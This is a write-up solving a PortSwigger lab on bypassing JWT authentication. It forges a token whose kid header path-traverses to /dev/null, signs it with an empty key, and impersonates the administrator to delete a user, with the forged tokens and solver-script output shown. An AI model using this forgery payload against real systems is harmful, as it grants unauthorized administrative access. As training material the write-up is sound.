# Lab: JWT authentication bypass via kid header path traversal

### Instructions

This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the `kid` parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

We can log in with the given credentials and find a JWT is issued:

```
eyJraWQiOiJlNzM2MWNlNi1mZTlmLTQxMWMtYWZlYi0wOWRkZDZkODgwNmEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5NDg2MDI1NSwic3ViIjoid2llbmVyIn0.8tB2vylcwQbGKcNTsxWkBioi7YwOP7Xjd5xM08mn_qk
```

Decoding it we find:

```json
{
  "kid": "e7361ce6-fe9f-411c-afeb-09ddd6d8806a",
  "alg": "HS256"
}
```

And the payload:

```json
{
  "iss": "portswigger",
  "exp": 1794860255,
  "sub": "wiener"
}
```

We use the JWT Editor plugin in burp to generate a new symmetric key, and set the `k` value to empty:

```json
{
    "kty": "oct",
    "kid": "654442d9-bf5b-49ce-9f5d-ba2601f9f2a5",
    "k": ""
}
```

Then we can modify the header and payload:

Let's manipulate the `kid` and use the field to reach for an internal file:

```json
{
  "kid": "../../../../../../../dev/null",
  "alg": "HS256"
}
```

And set the user to `administrator` in the payload:

```json
{
  "iss": "portswigger",
  "exp": 1794860255,
  "sub": "administrator"
}
```

This leaves us with:

```
eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5NDg2MDI1NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.jcxL1xTOzfzl90sjXFL6Odk64N8ce2wGQNUlaQ0NsSs
```

We can then sign the modified key and forward the request and we are given the option to delete the `carlos` user, which solves the lab.

```
Users
wiener - Delete
carlos - Delete
```

### Python Solution

See `jwt_06.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/JWT_Attacks/JWT_06_jwt_authentication_bypass_via_kid_header_path_traversal]
└─$ python jwt_06.py https://0ab600040377391182512e5300630086.web-security-academy.net 
[+] Logged in as wiener
[+] Forged session cookie with kid path traversal to /dev/null, sub=administrator
[+] Deleted carlos
[+] Lab solved!
```